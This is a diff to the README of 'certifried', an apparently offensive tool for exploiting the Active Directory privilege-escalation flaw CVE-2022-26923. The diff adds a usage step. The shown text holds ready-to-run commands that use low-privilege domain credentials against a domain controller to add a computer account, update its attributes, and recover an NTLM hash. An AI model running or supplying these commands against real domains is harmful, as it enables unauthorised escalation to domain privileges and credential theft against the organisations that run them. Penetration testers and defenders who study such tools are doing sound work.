@@ -4,6 +4,10 @@
 Certifried makes steps easier to replicate to abuse the new CVE-2022-26923. However below is the manual steps to replicate the vulnerability. Detailed article can be read [here](https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4) from the original author.
 
 ## Usage
+1. Just add computer and update neccessary attributes
+```
+python3 certifried.py domain.com/lowpriv:'Password1' -dc-ip 10.10.10.10
+```
 1. Recover NTLM hash
 ```
 python3 certifried.py domain.com/lowpriv:'Password1' -dc-ip 10.10.10.10 -use-ldap
